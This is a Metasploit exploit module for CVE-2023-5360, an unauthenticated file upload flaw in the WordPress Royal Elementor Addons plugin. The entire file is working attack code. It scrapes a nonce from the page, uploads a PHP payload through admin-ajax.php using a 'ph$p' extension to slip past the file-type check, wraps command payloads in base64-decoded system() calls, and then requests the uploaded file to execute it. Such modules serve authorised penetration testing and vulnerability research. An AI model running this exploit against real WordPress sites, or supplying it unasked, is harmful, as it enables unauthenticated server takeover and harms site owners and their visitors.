##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Royal Elementor Addons RCE',
        'Description' => %q{
          Exploit for the unauthenticated file upload vulnerability in WordPress Royal Elementor Addons and Templates plugin (< 1.3.79).
        },
        'Author' => [
          'Fioravante Souza', # Vulnerability discovery
          'Valentin Lobstein' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-5360'],
          ['URL', 'https://vulners.com/nuclei/NUCLEI:CVE-2023-5360'],
          ['WPVDB', '281518ff-7816-4007-b712-63aed7828b34']
        ],
        'Platform' => ['unix', 'linux', 'win', 'php'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2023-11-23',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Privileged' => false,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
  )
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    wp_version = wordpress_version
    print_status("WordPress Version: #{wp_version}") if wp_version

    check_code = check_plugin_version_from_readme('royal-elementor-addons', '1.3.79')

    if check_code.code != 'appears'
      return CheckCode::Safe
    end

    plugin_version = check_code.details[:version]
    print_good("Detected Royal Elementor Addons version: #{plugin_version}")
    return CheckCode::Appears
  end

  def exploit
    print_status('Attempting to retrieve nonce...')
    nonce = retrieve_nonce

    print_status('Sending payload')
    uri = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')

    data = {
      'action' => 'wpr_addons_upload_file',
      'max_file_size' => rand(10001),
      'allowed_file_types' => 'ph$p',
      'triggering_event' => 'click',
      'wpr_addons_nonce' => nonce
    }

    file_content = '<?php '
    file_content << (payload_instance.arch.include?(ARCH_PHP) ? payload.encoded : "system(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));")
    file_content << '?>'

    file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.ph$p"

    post_data = Rex::MIME::Message.new
    post_data.add_part(file_content, 'application/octet-stream', nil, "form-data; name=\"uploaded_file\"; filename=\"#{file_name}\"")
    data.each_pair do |key, value|
      post_data.add_part(value.to_s, nil, nil, "form-data; name=\"#{key}\"")
    end

    res = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => post_data.to_s
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received from the target')
    end

    if res.code == 200 && res.body.include?('success')
      print_good('Payload uploaded successfully')
      response_data = JSON.parse(res.body)
      if response_data.key?('data') && response_data['data'].key?('url')
        file_url = response_data['data']['url']
        print_status('Triggering the payload')
        send_request_cgi({
          'uri' => file_url,
          'method' => 'GET'
        })

      else
        fail_with(Failure::UnexpectedReply, 'Payload uploaded but no URL returned in the response')
      end
    else
      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')
    end
  end

  def retrieve_nonce
    res = send_request_cgi('uri' => normalize_uri(target_uri.path), 'method' => 'GET')

    fail_with(Failure::Unreachable, 'No response received from the target') if res.nil?
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code from the target: #{res.code}") if res.code != 200

    match = res.body.match(/var\s+WprConfig\s*=\s*({.+?});/)
    fail_with(Failure::NoTarget, 'Nonce not found in the response. Is Royal Elementor Addons activated AND being used by the WordPress site being targeted?') if match.nil? || match[1].nil?

    nonce = JSON.parse(match[1])['nonce']
    fail_with(Failure::NoTarget, 'Parsed a response, but the nonce value is missing') if nonce.nil?

    print_good("Nonce found in response: #{nonce.inspect}")
    nonce
  end
end
